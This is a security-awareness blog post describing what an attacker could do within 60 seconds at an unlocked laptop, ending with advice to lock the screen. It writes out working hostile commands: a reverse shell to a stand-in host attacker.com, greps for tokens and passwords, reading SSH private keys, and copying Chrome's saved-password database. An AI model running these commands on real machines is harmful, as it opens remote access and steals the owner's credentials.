---
layout: post
title: "The unlocked screen — what happens in 60 seconds"
date: 2026-03-26
categories: [physical-security, red-team]
tags: [physical, coworking, awareness]
excerpt: "You leave for coffee. Here's what an attacker can do before you're back."
---

You're at a coworking space. You stand up to grab a coffee. Your screen is unlocked.

That's all it takes.

## What 60 seconds actually looks like

Most people imagine an attacker needs time, tools, and preparation. In a physical environment, they need none of that. Here's what can happen before your coffee is ready.

**Add a persistent backdoor**

```bash
nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
```

One line. Runs silently in the background. The attacker now has a shell on your machine — even after you come back, lock your screen, and go home.

**Steal cached credentials**

```bash
cat ~/.gitconfig
grep -r "token\|password\|secret" ~/.config 2>/dev/null
```

Most developers have tokens and API keys cached in plaintext on their filesystem. Git, AWS CLI, npm — all of them store credentials locally.

**Clone your SSH keys**

```bash
cat ~/.ssh/id_rsa
```

Your private key, copied in 3 seconds. Now they can authenticate as you to any server that trusts that key.

**Dump browser passwords**

Chrome stores saved passwords in a local SQLite database. On macOS:

```bash
cp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data /tmp/stolen.db
```

Everything you've ever saved in Chrome — bank, email, work systems — now in a file they can exfiltrate.

## The mindset shift

The common assumption is: *"I have nothing interesting on this machine."*

That's the wrong question. The right question is: *"What does this machine have access to?"*

Your laptop is a door. It has access to your company's GitHub, your cloud infrastructure, your internal tools, your teammates' systems. An attacker doesn't want your machine — they want what your machine can reach.

## The fix is simple

`Win + L` on Windows. `Cmd + Ctrl + Q` on macOS.

One key combination. Every time you stand up. No exceptions.

The coffee is not worth the incident report.
